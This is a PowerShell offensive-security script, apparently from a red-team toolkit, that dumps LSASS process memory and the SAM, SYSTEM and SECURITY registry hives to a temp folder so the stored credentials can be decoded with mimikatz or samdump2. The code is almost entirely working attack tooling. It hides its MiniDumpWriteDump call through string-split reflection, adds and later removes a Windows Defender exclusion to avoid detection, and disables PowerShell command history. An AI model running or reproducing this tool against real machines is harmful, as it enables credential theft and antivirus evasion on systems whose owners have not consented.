<#
.SYNOPSIS
   Dumps LSASS, SAM, SYSTEM, SECURITY metadata

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: None
   Optional Dependencies: Administrator, WinDefend
   PS cmdlet Dev version: v2.1.12

.DESCRIPTION
   Dumps LSASS, SAM, SYSTEM, SECURITY metadata into %tmp%
   Remark: Use mim[i]ka[t]z or samdump2 to decode metadata.

   Remark: CmdLet creates Windows Defender folder exclusion
   if executed with administrator privileges, then removes
   the folder exclusion after dumping all the files on disk.

.Parameter Storage
   Where to store dump files (default: $Env:TMP)

.EXAMPLE
   PS C:\> Get-Help .\DumpLsass.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\DumpLsass.ps1 -Storage "$Env:TMP"
   Dumps lsass\sam\system\security data to %tmp%

.INPUTS
   None. You cannot pipe objects into DumpLsass.ps1

.OUTPUTS
   Privileges: Administrator
    - Created folder exclusion in Defender.
   Dumping LSASS data to: 'C:\Users\pedro\AppData\Local\Temp\lsass_888.dmp'
   Dumping sam, system, security data to: 'C:\Users\pedro\AppData\Local\Temp'
    - Deleted folder exclusion from Defender.
   Done: 00:00:06 - Decode with mim[i]ka[t]z\samdump2 ..
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://gist.github.com/r00t-3xp10it/8b770a33d06744f8dd0cbf8e007ec994
#>


## CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Storage="$Env:TMP"
)


Write-Host ""
$Exclusion = "False"
$CmdletVersion = "v2.1.12"
$ScanStartTimer = (Get-Date)
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@DumpLsass $CmdletVersion {SSA@RedTeam}"
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")


If($IsClientAdmin -iMatch 'True')
{
   If([bool](Get-Service -Name "WinDefend") -iMatch 'True')
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it, @sinfulz
         Helper - Dump LSASS process metadata

      .NOTES
         This Function creates one Windows Defender Folder Exclusion
         to be abble to dump lsass metadata without trigger detection
         if this cmdlet its executed with administrator privileges.
      #>

      write-host "   Privileges:" -NoNewline
      write-host " Administrator" -ForegroundColor Yellow
      If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -iMatch 'True')
      {
         ## Create folder exclusion in Defender.
         Add-MpPreference -ExclusionPath "$Storage" -Force
         write-host "    - Created" -ForegroundColor Green -NoNewline
         write-host " folder exclusion in Defender."
         $Exclusion = "True"
      }
      Else
      {
         write-host "    - fail to create folder exclusion (Defender)" -ForegroundColor Red
         write-host "    - " -ForegroundColor Red -NoNewline
         write-host "ConfigDefender Set-MpPreference module missing." -ForegroundColor DarkYellow
      }
   }
   Else
   {
         write-host "    - WinDefend service not found .." -ForegroundColor Red
         write-host "    - " -ForegroundColor Red -NoNewline
         write-host "fail to create the folder exclusion." -ForegroundColor DarkYellow
   }
}
Else
{
   write-host "   Privileges:" -NoNewline
   write-host " UserLand" -ForegroundColor Yellow
}


Start-Sleep -Seconds 1
## Dump lsass process metadata on disk
$ProcessName = (Get-Process -Name lsass)
## Does not trigger detection if executed with UserLand privileges
# If exec with admin privs than a folder exclusion its created on Defender
$Assembly = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
$Nested = $Assembly.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
$Reflection = [Reflection.BindingFlags] 'NonPublic, Static'
$Method = $Nested.GetMethod('MiniDum'+'pWriteDump', $Reflection) 

## Creating dump file name
$FileName = "$($ProcessName.Name)_$($ProcessName.Id).dmp"
$FullPath = Join-Path "$Storage" "$FileName"
$FileMode = New-Object IO.FileStream($FullPath, [IO.FileMode]::Create)
$R = $Method.Invoke($null, @($ProcessName.Handle,$G,$FileMode.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$FileMode.Close()

## Print Info OnScreen
Write-Host "   Dumping lsass metadata to: '" -NoNewline
Write-Host "$Storage\$FileName" -ForegroundColor Yellow -NoNewline
Write-Host "'"


If($IsClientAdmin -iMatch 'True')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump SAM, SYSTEM, SECURITY registry hive(s) data!
   #>

   Write-Host "   Dumping sam, system, security data to: '" -NoNewline
   Write-Host "$Storage" -ForegroundColor Yellow -NoNewline
   Write-Host "'"

   ## Delete old dumps left behind by previous executions.
   If(Test-Path -Path "$Storage\sam" -EA SilentlyContinue){Remove-Item -Path "$Storage\sam" -Force}
   If(Test-Path -Path "$Storage\system" -EA SilentlyContinue){Remove-Item -Path "$Storage\system" -Force}
   If(Test-Path -Path "$Storage\security" -EA SilentlyContinue){Remove-Item -Path "$Storage\security" -Force}

   ## Use cmd to dump related files
   cmd /R reg save hklm\sam "$Storage\sam"|Out-Null
   cmd /R reg save hklm\system "$Storage\system"|Out-Null
   cmd /R reg save hklm\security "$Storage\security"|Out-Null
}
Else
{
   write-host "    - Admin privs required to dump sam, system, security metadata." -ForegroundColor Red
}


## CleanUP
Start-Sleep -Milliseconds 600
If($Exclusion -iMatch "True")
{
   If([bool](Get-MpPreference).ExclusionPath -iMatch 'True')
   {
      ## Delete folder exclusion from Defender.
      Remove-MpPreference -ExclusionPath "$Storage" -Force
      write-host "    - Deleted" -ForegroundColor Green -NoNewline
      write-host " folder exclusion from Defender."
      Start-Sleep -Seconds 1
   }
}


#Internal CmdLet Clock Timmer
$ElapsTime = $(Get-Date) - $ScanStartTimer
$TotalTime = "{0:HH:mm:ss}" -f ([datetime]$ElapsTime.Ticks) #Counts the diferense between 'start|end'!
Write-Host "   Done: " -ForegroundColor Green -NoNewline
Write-Host "$TotalTime" -ForegroundColor Yellow -NoNewline
Write-Host " - Decode with mim[i]ka[t]z\samdump2 ..`n" -ForegroundColor Green